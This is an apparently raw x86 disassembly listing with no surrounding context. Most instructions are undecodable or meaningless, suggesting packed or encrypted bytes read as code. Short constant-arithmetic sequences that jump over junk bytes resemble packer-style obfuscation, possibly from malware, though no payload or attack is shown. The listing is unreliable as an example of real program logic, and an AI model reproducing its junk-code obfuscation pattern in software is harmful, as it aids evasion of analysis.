  4137df:	into   
  4137e0:	das    
  4137e1:	bound  ebx,QWORD PTR [edx+0x52a91b40]
  4137e7:	stos   BYTE PTR es:[edi],al
  4137e8:	and    ebp,DWORD PTR [esi-0x7b]
  4137eb:	imul   esi,DWORD PTR [esi-0x71],0xdaa5af7c
  4137f2:	and    ch,cl
  4137f4:	sub    DWORD PTR [eax-0x6c],eax
  4137f7:	or     cl,BYTE PTR [edi]
  4137f9:	mov    edx,0xbafec884
  4137fe:	(bad)  
  4137ff:	lock mov edi,0xdb695c93
  413805:	mov    eax,ds:0xb32ed53
  41380a:	shr    DWORD PTR ds:0x17e02fff,0x89
  413811:	inc    ebp
  413812:	fadd   st(7),st
  413814:	inc    ebp
  413815:	cld    
  413816:	mov    edi,0xe900001b
  41381b:	mov    BYTE PTR [eax],0x0
  41381e:	add    BYTE PTR [edx-0x28],ah
  413821:	(bad)
  413824:	std    
  413825:	arpl   si,bx
  413827:	jg     0x41385c
  413829:	add    cl,BYTE PTR [esi+0x57]
  41382c:	ret    0x33d5
  41382f:	aas    
  413830:	fld    DWORD PTR [eax]
  413832:	add    BYTE PTR [esi-0x64000000],ch
  413838:	aad    0xd
  41383a:	lds    edx,FWORD PTR [ebp-0x77]
  41383d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41383e:	cmp    al,BYTE PTR [esi]
  413840:	call   0x8d6192a6
  413845:	fwait
  413846:	out    0x14,al
  413848:	dec    ebp
  413849:	rcl    dh,0xac
  41384c:	cmp    BYTE PTR [esi-0x765b48be],bl
  413852:	mov    esp,0xc63fc4e3
  413857:	pop    esp
  413858:	and    cl,BYTE PTR [esp+edx*2]
  41385b:	add    edx,DWORD PTR [edx-0x78a5e542]
  413861:	out    dx,eax
  413862:	dec    ebx
  413863:	sub    eax,0x6cc3e4c7
  413868:	mov    WORD PTR [edi+ebx*2],?
  41386b:	(bad)  
  41386c:	cwde   
  41386d:	sub    cl,BYTE PTR [ebp-0x3f9254e1]
  413873:	mov    ecx,0x1d31dc76
  413878:	call   0x3612cc82
  41387d:	inc    edi
  41387e:	sti    
  41387f:	inc    edx
  413880:	cld    
  413881:	xchg   edx,eax
  413882:	inc    esp
  413883:	sub    DWORD PTR [ebx],edx
  413885:	adc    ebx,esp
  413887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413888:	mov    DWORD PTR [eax+0x27],esi
  41388b:	sub    ebx,DWORD PTR [edi-0x7a46627b]
  413891:	inc    esp
  413892:	and    ah,BYTE PTR [esi+0x52]
  413895:	arpl   WORD PTR [eax-0x65],bx
  413898:	dec    ebp
  413899:	outs   dx,DWORD PTR ds:[esi]
  41389a:	jg     0x413888
  41389c:	jg     0x41382b
  41389e:	push   0xcafd15af
  4138a3:	jno    0x4138d5
  4138a5:	inc    ebp
  4138a6:	(bad)  
  4138a7:	out    dx,eax
  4138a8:	xchg   ecx,eax
  4138a9:	std    
  4138aa:	and    BYTE PTR ds:0xf76b15aa,dl
  4138b0:	push   edi
  4138b1:	loope  0x413834
  4138b3:	cli    
  4138b4:	add    dl,dh
  4138b6:	mov    bl,0x2e
  4138b8:	inc    esp
  4138b9:	push   0xf1f1bf9a
  4138be:	jno    0x41390e
  4138c0:	mov    esi,0x850c2bf8
  4138c5:	jmp    0xe9d5:0x9b3ffdc2
  4138cc:	adc    BYTE PTR [ebx+0x3d],cl
  4138cf:	je     0x41387f
  4138d1:	inc    esp
  4138d2:	xchg   ebp,eax
  4138d3:	(bad)  
  4138d4:	ds mov cl,0x8a
  4138d7:	lock or DWORD PTR [ebp+0x1f71da4e],0x1430798b
  4138e2:	cdq    
  4138e3:	es mov bl,0xc7
  4138e6:	inc    ebp
  4138e7:	hlt    
  4138e8:	popa   
  4138e9:	pop    ebp
  4138ea:	add    BYTE PTR [eax],al
  4138ec:	mov    DWORD PTR [ebp-0x8],0x2a7f
  4138f3:	mov    eax,DWORD PTR [ebp-0x8]
  4138f6:	mov    ecx,DWORD PTR [ebp-0xc]
  4138f9:	shr    eax,1
  4138fb:	add    eax,0x3966
  413900:	imul   eax,ecx
  413903:	mov    ecx,DWORD PTR [ebp-0x4]
  413906:	jmp    0x4139d1
  41390b:	mov    al,0x89
  41390d:	mov    ds:0xb0bbbb92,al
  413912:	stos   DWORD PTR es:[edi],eax
  413913:	lea    eax,[ebx+0x62]
  413916:	dec    esi
  413917:	outs   dx,BYTE PTR ds:[esi]
  413918:	jns    0x4138fb
  41391a:	aas    
  41391b:	in     eax,dx
  41391c:	fld    DWORD PTR [eax]
  41391e:	add    BYTE PTR [esi+0x67000000],ch
  413924:	fadd   QWORD PTR ds:0xdf17bcb8
  41392a:	lods   eax,DWORD PTR ds:[esi]
  41392b:	fnstcw WORD PTR [eax]
  41392d:	stos   DWORD PTR es:[edi],eax
  41392e:	mov    sp,0xaccf
  413932:	hlt    
  413933:	fadd   st,st(6)
  413935:	inc    edi
  413936:	loope  0x4138dd
  413938:	ja     0x4138f1
  41393a:	sbb    BYTE PTR [bx],ah
  41393d:	xor    dl,dl
  41393f:	sbb    DWORD PTR [edx-0x12],edi
  413942:	inc    ecx
  413943:	jne    0x4139a2
  413945:	test   DWORD PTR [ebx+0x6d31b664],edx
  41394b:	inc    edi
  41394c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41394d:	push   ss
  41394e:	fnsave [edi-0x2e]
  413951:	sub    BYTE PTR [ecx-0x7a],bh
  413954:	inc    eax
  413955:	dec    ecx
  413956:	aaa    
  413957:	out    0xf3,eax
  413959:	dec    ecx
  41395a:	ss cwde 
  41395c:	inc    ebx
  41395d:	jo     0x41391f
  41395f:	sti    
  413960:	and    BYTE PTR es:[edx],0x3c
  413964:	dec    BYTE PTR [ebx+0x5a87c922]
  41396a:	out    0x16,al
  41396c:	pop    esi
  41396d:	nop
  41396e:	mov    bl,0xf0
  413970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413971:	mov    bh,0x73
  413973:	scas   eax,DWORD PTR es:[edi]
  413974:	fwait
  413975:	push   ebx
  413976:	int3   
  413977:	mov    ecx,0xd9ffc29d
  41397c:	push   0x4fb747f0
  413981:	pop    ss
  413982:	movaps XMMWORD PTR [edi-0x29],xmm4
  413986:	mov    cl,0xac
  413988:	(bad)  
  413989:	pop    ss
  41398a:	sbb    eax,0x939f7ae6
  41398f:	and    DWORD PTR [edx-0x1a5409d7],esp
  413995:	sub    al,BYTE PTR [ecx-0x5505c5d7]
  41399b:	fstp   QWORD PTR es:[eax]
  41399e:	(bad)  
  41399f:	loop   0x4139c1
  4139a1:	push   eax
  4139a2:	xchg   ebx,eax
  4139a3:	mov    dh,bh
  4139a5:	add    BYTE PTR ds:0x4601695a,bh
  4139ab:	mov    eax,ds:0x7bc55f4f
  4139b0:	adc    ch,BYTE PTR [edi]
  4139b2:	fwait
  4139b3:	jge    0x413954
  4139b5:	sub    BYTE PTR [esi+edi*8-0x6cc23305],ch
  4139bc:	repnz in eax,0x18
  4139bf:	je     0x413995
  4139c1:	fldcw  WORD PTR [ebx+0x50]
  4139c4:	ret    
  4139c5:	inc    ecx
  4139c6:	ins    BYTE PTR es:[edi],dx
  4139c7:	fs cs out dx,al
  4139ca:	shl    WORD PTR [eax-0x4d],1
  4139ce:	pop    esi
  4139cf:	push   ebp
  4139d0:	xor    BYTE PTR [ebx],ch
  4139d2:	shr    DWORD PTR [ecx-0x40],0xb6
  4139d6:	jl     0x4139d8
  4139d8:	add    BYTE PTR ds:0x7738ea84,dh
  4139de:	mov    DWORD PTR [ebp-0x6c],eax
  4139e1:	mov    DWORD PTR [ebp-0x14],0x7c1d
  4139e8:	jmp    0x413ab3
  4139ed:	test   BYTE PTR [edi-0x50],dh
  4139f0:	xchg   bl,dh
  4139f2:	(bad)  
  4139f3:	mov    dh,0x77
  4139f5:	gs dec edi
  4139f7:	ja     0x413a62
  4139f9:	outs   dx,DWORD PTR ds:[esi]
  4139fa:	mov    ds:0xda9b6d2b,eax
  4139ff:	add    BYTE PTR [eax],al
  413a01:	scas   al,BYTE PTR es:[edi]
  413a02:	add    BYTE PTR [eax],al
  413a04:	add    BYTE PTR [ebx-0x16671167],dh
  413a0a:	jge    0x4139a3
  413a0c:	fcomp  QWORD PTR [edx]
  413a0e:	jnp    0x413a50
  413a10:	sbb    edx,ebx
  413a12:	xor    DWORD PTR [esi],esp
  413a14:	sbb    BYTE PTR [ebx+ebx*8-0x6d],0x74
  413a19:	retf   0x9907
  413a1c:	mov    edx,0xfc1f6cbc
  413a21:	clc    
  413a22:	adc    eax,DWORD PTR [edi-0x28d99a6c]
  413a28:	imul   edi,DWORD PTR ds:0xe58334be,0x66
  413a2f:	(bad)  
  413a30:	add    BYTE PTR [ebp+ebp*8-0x43],0x28
  413a35:	stos   DWORD PTR es:[edi],eax
  413a36:	int3   
  413a37:	and    al,BYTE PTR [edi]
  413a39:	outs   dx,BYTE PTR ds:[esi]
  413a3a:	arpl   WORD PTR ss:[edi],ax
  413a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a3e:	dec    edi
  413a3f:	sub    al,0xb6
  413a41:	hlt    
  413a42:	test   eax,0x908705e5
  413a47:	mul    DWORD PTR [ebx-0x7b]
  413a4a:	test   dh,bl
  413a4c:	sub    DWORD PTR [ebp+ebx*2-0x6a86d7f0],eax
  413a53:	push   cs
  413a54:	jl     0x413a07
  413a56:	dec    ebx
  413a57:	test   al,0x69
  413a59:	dec    edx
  413a5a:	ficomp WORD PTR [bx+si-0x64]
  413a5e:	jno    0x413a25
  413a60:	cmp    BYTE PTR [eax],dh
  413a62:	sahf   
  413a63:	btc    DWORD PTR [ebp-0x71736f6b],ecx
  413a6a:	sub    BYTE PTR [ebx],ah
  413a6c:	inc    esp
  413a6d:	pop    ds
  413a6e:	inc    ecx
  413a6f:	inc    esp
  413a70:	pop    ss
  413a71:	add    al,0x31
  413a73:	cdq    
  413a74:	retf   
  413a75:	jnp    0x413add
  413a77:	lods   eax,DWORD PTR ds:[esi]
  413a78:	pop    eax
  413a79:	in     eax,0xed
  413a7b:	(bad)  [ecx-0x6cab85]
  413a81:	out    dx,eax
  413a82:	and    al,0xba
  413a84:	dec    ebx
  413a85:	mov    eax,ds:0x73ffd2ea
  413a8a:	stc    
  413a8b:	cmp    cl,al
  413a8d:	out    0xb7,al
  413a8f:	cmp    DWORD PTR [edx+0x45e6c21b],ebp
  413a95:	xchg   esi,eax
  413a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a97:	jbe    0x413a29
  413a99:	ja     0x413a48
  413a9b:	mov    dl,0x41
  413a9d:	jmp    0xd9103521
  413aa2:	js     0x413af9
  413aa4:	mov    ?,WORD PTR [ecx-0x417fd85e]
  413aaa:	cmp    BYTE PTR [ecx+0x52103a51],cl
  413ab0:	(bad)  
  413ab1:	and    eax,0xfc45c724
  413ab6:	inc    ebp
  413ab7:	jl     0x413ab9
  413ab9:	add    cl,ch
  413abb:	mov    BYTE PTR [eax],0x0
  413abe:	add    BYTE PTR [esi+0x5],dh
  413ac1:	jbe    0x413aa3
  413ac3:	ja     0x413ab8
  413ac5:	not    BYTE PTR [edi-0x5e7c9e17]
  413acb:	nop
  413acc:	ret    0xc355
  413acf:	dec    ecx
  413ad0:	fild   DWORD PTR [eax]
  413ad2:	add    BYTE PTR [esi+0x4e000000],ch
  413ad8:	pop    ecx
  413ad9:	xor    eax,0x9ed5ce8d
  413ade:	dec    edi
  413adf:	adc    DWORD PTR [ebx+0x1cc973ad],0x7e
  413ae6:	xchg   BYTE PTR [ebp-0x722e886d],dh
  413aec:	cmp    ch,0x8f
  413aef:	mov    ebp,0xf39726a5
  413af4:	dec    ebp
  413af5:	cmp    eax,0x803300b2
  413afa:	call   0x3a1638c6
  413aff:	cmp    al,bh
  413b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b02:	jmp    DWORD PTR [ebp+esi*4+0x70]
  413b06:	pop    edx
  413b07:	data16 mov BYTE PTR [edx],dh
  413b0a:	adc    al,0xd
  413b0c:	and    eax,0x2a8d0e35
  413b11:	add    BYTE PTR [eax],al
  413b13:	out    dx,eax
  413b14:	dec    ebx
  413b15:	or     DWORD PTR [edi],esp
  413b17:	(bad)  
  413b18:	gs in  al,0x75
  413b1b:	add    ebp,ebx
  413b1d:	mov    dh,0x1d
  413b1f:	das    
  413b20:	pop    fs
  413b22:	cmp    al,0x6e
  413b24:	imul   edi,DWORD PTR [esi+0x53],0xffffffa7
  413b28:	rol    BYTE PTR [eax-0x66],0xad
  413b2c:	sbb    al,0x24
  413b2e:	pop    ecx
  413b2f:	lahf   
  413b30:	xor    al,0xfd
  413b32:	xchg   esi,eax
  413b33:	(bad)  
  413b34:	iret   
  413b35:	pop    edx
  413b36:	cwde   
  413b37:	in     al,0x74
  413b39:	mov    ds:0x24132a96,al
  413b3e:	rcl    ecx,1
  413b40:	or     dl,ch
  413b42:	mov    esi,0xd23c748a
  413b47:	push   es
  413b48:	jbe    0x413b99
  413b4a:	icebp  
  413b4b:	arpl   WORD PTR [ebx-0x3],cx
  413b4e:	leave  
  413b4f:	fs jp  0x413ba7
  413b52:	cmc    
  413b53:	addr16 pop ebx
  413b55:	inc    ebp
  413b56:	jbe    0x413b67
  413b58:	sub    DWORD PTR [esi],ebp
  413b5a:	rol    BYTE PTR [ecx+ebx*1],1
  413b5d:	(bad)  
  413b5e:	rol    BYTE PTR [edi],0xe1
  413b61:	push   ds
  413b62:	jb     0x413b2a
  413b64:	jp     0x413b25
  413b66:	js     0x413af7
  413b68:	and    ecx,DWORD PTR [ebx-0x3fd2f0bc]
  413b6e:	add    ah,cl
  413b70:	ret    
  413b71:	cmp    eax,edx
  413b73:	push   edi
  413b74:	into   
  413b75:	fnstcw WORD PTR [ebx+0xb6ab4d5]
  413b7b:	call   0x5f80:0xc02d4313
  413b82:	(bad)  
  413b84:	popa   
  413b85:	mov    DWORD PTR [ebp-0xc],0x2e61
  413b8c:	mov    DWORD PTR [ebp-0x8],0x1d6b
  413b93:	mov    eax,DWORD PTR [ebp-0x8]
  413b96:	jmp    0x413c61
  413b9b:	clc    
  413b9c:	outs   dx,DWORD PTR ds:[esi]
  413b9d:	call   0x60ff:0xf9f79f43
  413ba4:	ja     0x413b53
  413ba6:	add    bl,cl
  413ba8:	in     eax,dx
  413ba9:	movd   mm6,edi
  413bac:	fild   DWORD PTR [eax]
  413bae:	add    BYTE PTR [esi-0xb000000],ch
  413bb4:	(bad)  
  413bb5:	loop   0x413bf6
  413bb7:	rcr    BYTE PTR [ebx-0x46d61b76],cl
  413bbd:	xchg   ebp,eax
  413bbe:	fidivr DWORD PTR [eax+0xb5f30ca]
  413bc4:	and    al,0xba
  413bc6:	pop    eax
  413bc7:	jo     0x413c3d
  413bc9:	xchg   ecx,eax
  413bca:	divps  xmm6,XMMWORD PTR [ebx+0x7c]
  413bce:	dec    ebx
  413bcf:	lahf   
  413bd0:	out    0xbc,al
  413bd2:	dec    ebp
  413bd3:	push   0xf6db95ef
  413bd8:	push   esp
  413bd9:	sar    BYTE PTR [esi-0x77],cl
  413bdc:	jnp    0x413c4a
  413bde:	aad    0x64
  413be0:	jbe    0x413b70
  413be2:	jl     0x413b81
  413be4:	stc    
  413be5:	out    0x37,eax
  413be7:	sbb    DWORD PTR [edi+0x5d],edi
  413bea:	cld    
  413beb:	fwait
  413bec:	inc    ebx
  413bed:	lods   al,BYTE PTR ds:[esi]
  413bee:	mov    eax,0x687e322b
  413bf3:	adc    bl,ch
  413bf5:	leave  
  413bf6:	inc    esi
  413bf8:	jl     0x413c3e
  413bfa:	xor    BYTE PTR [ebx+ebp*8-0x12],0x72
  413bff:	leave  
  413c00:	or     BYTE PTR [edx+0x2b5410aa],ch
  413c06:	jb     0x413c31
  413c08:	std    
  413c09:	adc    DWORD PTR ds:0xaa90ff95,esp
  413c0f:	out    0xa2,eax
  413c11:	ds pusha 
  413c13:	inc    eax
  413c14:	ds jbe 0x413c4c
  413c17:	add    eax,eax
  413c19:	int3   
  413c1a:	test   eax,0x6fd97759
  413c1f:	dec    edx
  413c20:	sub    bl,ch
  413c22:	out    0xe0,eax
  413c24:	push   es
  413c25:	mov    ah,0x16
  413c27:	(bad)  [esi+0x4cabd32a]
  413c2d:	imul   ebx,DWORD PTR [eax],0xffffffc9
  413c30:	jecxz  0x413c21
  413c32:	sbb    al,0x61
  413c34:	pop    esi
  413c35:	(bad)  
  413c36:	shr    bl,0x7b
  413c39:	add    esi,ebp
  413c3b:	push   ss
  413c3c:	jnp    0x413c23
  413c3e:	cmp    cl,BYTE PTR [edi-0x43]
  413c41:	adc    eax,0x6e5235ca
  413c46:	mov    al,ds:0x1e880dd7
  413c4b:	das    
  413c4c:	jae    0x413c1f
  413c4e:	and    ah,ah
  413c50:	xchg   edi,eax
  413c51:	adc    al,0x19
  413c53:	sub    esi,esp
  413c55:	and    al,0x74
  413c57:	pop    ebx
  413c58:	jns    0x413bfb
  413c5a:	fsubr  DWORD PTR ds:0x93bbf5e0
  413c60:	cli    
  413c61:	mov    ecx,DWORD PTR [ebp-0xc]
  413c64:	shr    eax,1
  413c66:	lea    eax,[eax+ecx*1-0x66b0]
  413c6d:	jmp    0x413d38
  413c72:	daa    
  413c73:	adc    dl,BYTE PTR ds:0xa7b735b6
  413c79:	xchg   ebx,eax
  413c7a:	push   eax
  413c7b:	or     ecx,DWORD PTR ds:0x59523130
  413c82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c83:	fadd   QWORD PTR [eax]
  413c85:	add    BYTE PTR [esi+0x61000000],ch
  413c8b:	inc    ecx
  413c8c:	int3   
  413c8d:	cmp    BYTE PTR [ebx-0x44],dl
  413c90:	push   ss
  413c91:	jo     0x413c3f
  413c93:	mov    al,0x8b
  413c95:	fld    QWORD PTR [eax+0x5898982a]
  413c9b:	sub    BYTE PTR [esi-0x7ca1ab02],0xbc
  413ca2:	inc    edi
  413ca3:	inc    ebx
  413ca4:	aam    0x4f
  413ca6:	push   ds
  413ca7:	ins    BYTE PTR es:[edi],dx
  413ca8:	sbb    BYTE PTR [ebp+0x66131053],bh
  413cae:	ds das 
  413cb0:	pop    esp
  413cb1:	fwait
  413cb2:	rol    DWORD PTR [ebx],0x39
  413cb5:	adc    eax,0x64ed5a5a
  413cba:	test   BYTE PTR [ebx-0x76eae5c1],bh
  413cc0:	sahf   
  413cc1:	push   ecx
  413cc2:	out    0x86,al
  413cc4:	cs or  ah,cl
  413cc7:	pop    edi
  413cc8:	and    DWORD PTR [edi],0xb68c3643
  413cce:	xlat   BYTE PTR ds:[ebx]
  413ccf:	fimul  WORD PTR ds:0xb79a746
  413cd5:	xchg   esp,eax
  413cd6:	xor    eax,0xfbc68a77
  413cdb:	loop   0x413d38
  413cdd:	add    eax,0xbfe62aec
  413ce2:	add    eax,0xb83dd984
  413ce7:	mov    edx,0xc184f8f5
  413cec:	push   edi
  413ced:	addr16 push esi
  413cef:	nop
  413cf0:	xchg   BYTE PTR [ebp+0x5],dl
  413cf3:	(bad)  
  413cf4:	jmp    0x413c86
  413cf6:	mov    ecx,0x15da9b79
  413cfb:	sub    eax,0x1d46bf1e
  413d00:	jmp    0x35af8702
  413d05:	add    DWORD PTR [ecx+0x651d4e3e],ebp
  413d0b:	jle    0x413cf6
  413d0d:	in     eax,0x8e
  413d0f:	arpl   WORD PTR fs:[eax+0x11ededd2],ax
  413d16:	gs push esi
  413d18:	cmp    DWORD PTR [ebp-0x4296af27],0xdb61dd7e
  413d22:	retf   0x8e0
  413d25:	nop
  413d26:	retf   
  413d27:	in     al,dx
  413d28:	jne    0x413ce2
  413d2a:	dec    edi
  413d2b:	sub    cl,ch
  413d2d:	mov    ds:0x73602198,al
  413d32:	xchg   esp,eax
  413d33:	daa    
  413d34:	add    al,0x6f
  413d36:	sbb    eax,0xfc4d8bfc
  413d3b:	imul   eax,ecx
  413d3e:	mov    ecx,DWORD PTR [ebp-0x14]
  413d41:	imul   eax,ecx
  413d44:	add    eax,0x69ab5cda
  413d49:	mov    DWORD PTR [ebp-0x24],eax
  413d4c:	mov    DWORD PTR [ebp-0x4],0x60d9d
  413d53:	mov    DWORD PTR [ebp-0xc],0x3f32
  413d5a:	mov    DWORD PTR [ebp-0x8],0x1f98
  413d61:	mov    DWORD PTR [ebp-0x14],0x44aa
  413d68:	jmp    0x413e33
  413d6d:	xchg   ecx,eax
  413d6e:	clc    
  413d6f:	shr    BYTE PTR [ebx],1
  413d71:	stc    
  413d72:	sub    edi,ebx
  413d74:	cli    
  413d75:	adc    BYTE PTR [esp+edx*1-0x6e],bl
  413d79:	cdq    
  413d7a:	(bad)  
  413d7c:	addr16 push ebx
  413d7e:	fld    QWORD PTR [eax]
  413d80:	add    BYTE PTR [esi+0x4b000000],ch
  413d86:	arpl   di,dx
  413d88:	jbe    0x413d2d
  413d8a:	add    al,0x81
  413d8c:	xor    DWORD PTR [ebp-0x6790ebe1],ecx
  413d92:	in     al,0x9
  413d94:	into   
  413d95:	add    al,0xcb
  413d97:	inc    ebp
  413d98:	push   ebp
  413d99:	mov    ds:0x6ead01fe,eax
  413d9e:	sub    DWORD PTR [esi-0x29],ebp
  413da1:	popa   
  413da2:	loope  0x413d24
  413da4:	mov    DWORD PTR [ebx+0x2f252d79],ecx
  413daa:	stos   BYTE PTR es:[edi],al
  413dab:	in     eax,dx
  413dac:	lock inc esi
  413dae:	cld    
  413daf:	adc    dh,BYTE PTR [esi+0x36c465a2]
  413db5:	(bad)  
  413db6:	aam    0xf0
  413db8:	ror    BYTE PTR [ecx],cl
  413dba:	push   ebx
  413dbb:	push   edi
  413dbc:	mov    eax,0x987c972a
  413dc1:	jb     0x413e3d
  413dc3:	jle    0x413e36
  413dc5:	push   0x35
  413dc7:	sahf   
  413dc8:	(bad)  
  413dc9:	dec    esp
  413dca:	test   BYTE PTR [ecx+0x3d2f210f],al
  413dd0:	into   
  413dd1:	int    0x7
  413dd3:	add    ebp,esi
  413dd5:	mov    edx,0x8976f617
  413dda:	loop   0x413d88
  413ddc:	fidivr WORD PTR [ebx+0xc854d6f]
  413de2:	cmp    dh,BYTE PTR [esi-0x6b]
  413de5:	fstp   TBYTE PTR [eax+eax*1]
  413de8:	pop    esi
  413de9:	or     eax,0x6c35b6b5
  413dee:	pop    esi
  413def:	pop    eax
  413df0:	mov    bh,0x82
  413df2:	jle    0x413e53
  413df4:	into   
  413df5:	xchg   esp,eax
  413df6:	mov    ds:0x6ac8a4c8,eax
  413dfb:	lea    eax,[ecx]
  413dfd:	mov    cl,BYTE PTR [esp+edi*1]
  413e00:	stos   DWORD PTR es:[edi],eax
  413e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e02:	push   ss
  413e03:	fwait
  413e04:	lds    eax,FWORD PTR [esi]
  413e06:	xchg   esi,eax
  413e07:	test   dh,0xb1
  413e0a:	xchg   esp,eax
  413e0b:	push   ebx
  413e0c:	or     BYTE PTR ss:0x6daa98ed,cl
  413e13:	sub    ah,BYTE PTR [edx]
  413e15:	fld    QWORD PTR [esi+0x7097a395]
  413e1b:	jb     0x413e62
  413e1d:	add    DWORD PTR [eax-0x3f],edi
  413e20:	lahf   
  413e21:	hlt    
  413e22:	cmp    dh,BYTE PTR [eax+ecx*4]
  413e25:	cmp    DWORD PTR [ebx+0x25],0x9c671242
  413e2c:	xchg   esp,eax
  413e2d:	inc    ecx
  413e2e:	jl     0x413df4
  413e30:	bound  esp,QWORD PTR [esi-0x13ba7433]
  413e36:	jmp    0x413f01
  413e3b:	xchg   DWORD PTR [edx-0x21c8b1da],esi
  413e41:	out    dx,eax
  413e42:	sti    
  413e43:	push   esi
  413e44:	jno    0x413e31
  413e46:	ins    DWORD PTR es:[edi],dx
  413e47:	or     DWORD PTR [eax-0x6f],ebp
  413e4a:	jo     0x413e4d
  413e4c:	fiadd  WORD PTR [eax]
  413e4e:	add    BYTE PTR [esi-0x52000000],ch
  413e54:	push   ecx
  413e55:	jmp    0x121e452e
  413e5a:	add    edx,0x3b
  413e5d:	test   al,0x61
  413e5f:	dec    ebx
  413e60:	push   esp
  413e61:	inc    edx
  413e62:	or     ebp,DWORD PTR [edx+0x55]
  413e65:	pop    ebx
  413e66:	das    
  413e67:	pop    edi
  413e68:	test   esp,edi
  413e6a:	out    dx,eax
  413e6b:	test   DWORD PTR [esi+0x6],eax
  413e6e:	ins    DWORD PTR es:[edi],dx
  413e6f:	xchg   DWORD PTR [edx],ebx
  413e71:	cmp    esp,0x16
  413e74:	jp     0x413edb
  413e76:	inc    edx
  413e77:	sub    dl,ah
  413e79:	mov    ebx,0x7cc98d63
  413e7e:	ins    BYTE PTR es:[edi],dx
  413e7f:	add    bl,cl
  413e81:	jge    0x413eab
  413e83:	out    dx,eax
  413e84:	out    dx,eax
  413e85:	jmp    0x413e3d
  413e87:	js     0x413ed0
  413e89:	jmp    0xf2324a7e
  413e8e:	aaa    
  413e8f:	xor    edi,DWORD PTR [ecx]
  413e91:	sti    
  413e92:	cmp    esp,ebx
  413e94:	jno    0x413e72
  413e96:	mov    eax,esi
  413e98:	pop    eax
  413e99:	pop    esi
  413e9b:	jmp    0x413ea2
  413e9d:	xor    BYTE PTR [edi],bh
  413e9f:	mov    dh,0x86
  413ea1:	push   cs
  413ea2:	inc    ebx
  413ea4:	dec    ebp
  413ea5:	cmp    BYTE PTR [edx+0x6d1aac26],bl
  413eab:	test   al,0x35
  413ead:	ins    BYTE PTR es:[edi],dx
  413eae:	jmp    0x413f27
  413eb0:	in     al,dx
  413eb1:	mov    eax,ds:0x24d9a367
  413eb6:	je     0x413eeb
  413eb8:	dec    DWORD PTR [edi-0x58f83a72]
  413ebe:	lods   eax,DWORD PTR ds:[esi]
  413ebf:	mov    es,WORD PTR [ebx+0x51]
  413ec2:	pusha  
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	ins    DWORD PTR es:[edi],dx
  413ec5:	pop    edi
  413ec6:	push   ss
  413ec7:	pusha  
  413ec8:	xor    dl,BYTE PTR [eax+0x36]
  413ecb:	cmp    eax,0x4e349e95
  413ed0:	jmp    0x413f2c
  413ed2:	leave  
  413ed3:	neg    BYTE PTR [edx+edi*2]
  413ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ed7:	lods   al,BYTE PTR ds:[esi]
  413ed8:	mov    cl,0x5c
  413eda:	lahf   
  413edb:	mov    ebx,0x14b40943
  413ee0:	scas   eax,DWORD PTR es:[edi]
  413ee1:	cdq    
  413ee2:	aad    0xa0
  413ee4:	pop    eax
  413ee5:	and    eax,0xc6e7f44a
  413eea:	mov    ecx,0x8ef2c42e
  413eef:	xchg   edx,eax
  413ef0:	das    
  413ef1:	(bad)  
  413ef2:	(bad)  [ebx]
  413ef4:	fsub   QWORD PTR [ebp+ebx*1+0x76]
  413ef8:	fdivr  DWORD PTR [esi*4-0x346ca3c2]
  413eff:	pop    esp
  413f00:	(bad)  
  413f01:	mov    ecx,DWORD PTR [ebp-0x8]
  413f04:	xor    eax,ecx
  413f06:	jmp    0x413fd1
  413f0b:	arpl   WORD PTR [esi-0x35],dx
  413f0e:	add    edi,edi
  413f10:	popf   
  413f11:	jmp    0x413f89
  413f13:	rcl    DWORD PTR [edi-0x25],cl
  413f16:	in     al,0xe7
  413f18:	jle    0x413eb2
  413f1a:	aas    
  413f1b:	scas   eax,DWORD PTR es:[edi]
  413f1c:	fiadd  WORD PTR [eax]
  413f1e:	add    BYTE PTR [esi-0x3f000000],ch
  413f24:	xchg   esp,eax
  413f25:	jp     0x413ede
  413f27:	fcompp 
  413f29:	mov    al,0x9d
  413f2b:	aaa    
  413f2c:	(bad)  
  413f2d:	dec    esi
  413f2e:	popf   
  413f2f:	xchg   edi,eax
  413f30:	jbe    0x413f17
  413f32:	mov    dl,BYTE PTR [ebp+0x12f63ec9]
  413f38:	addr16 inc esp
  413f3a:	addr16 mov ebp,0x76760bae
  413f40:	dec    esp
  413f41:	jmp    0x413ee9
  413f43:	(bad)  
  413f44:	loop   0x413f59
  413f46:	mov    ds:0x9112986e,eax
  413f4b:	or     dh,ch
  413f4d:	push   0x1917430f
  413f52:	mov    al,ds:0x8ac75bdc
  413f57:	test   eax,0x3a265152
  413f5c:	pop    edx
  413f5d:	adc    al,0x7b
  413f5f:	cld    
  413f60:	xor    DWORD PTR [esi-0x2e],edx
  413f63:	dec    esi
  413f64:	test   DWORD PTR [ebx-0x76],ecx
  413f67:	rol    DWORD PTR [edx],1
  413f69:	mul    BYTE PTR [edi]
  413f6b:	mov    ds:0xf390da58,eax
  413f70:	push   ebp
  413f71:	mov    cs,WORD PTR [edi]
  413f73:	xor    al,0xf9
  413f75:	cmp    al,0x53
  413f77:	sahf   
  413f78:	sub    eax,esi
  413f7a:	lock sbb BYTE PTR [edi+0x3f8c7556],dh
  413f81:	sub    bl,al
  413f83:	sbb    al,0x9b
  413f85:	or     cl,BYTE PTR [edx]
  413f87:	jmp    0x413f96
  413f89:	mov    ebx,0x527e737e
  413f8e:	pusha  
  413f8f:	call   0x8132:0x61bd916c
  413f96:	xchg   ecx,eax
  413f97:	mov    ebx,DWORD PTR [esi+0x7e]
  413f9a:	or     eax,0x85cf2b19
  413f9f:	cmp    al,0x28
  413fa1:	scas   al,BYTE PTR es:[edi]
  413fa2:	popa   
  413fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fa4:	adc    ah,BYTE PTR [edx+0x52]
  413fa7:	outs   dx,DWORD PTR ds:[esi]
  413fa8:	inc    esp
  413fa9:	(bad)  
  413faa:	xchg   ebp,eax
  413fab:	cmp    cl,BYTE PTR [eax+ebp*4-0x2240b017]
  413fb2:	repz icebp 
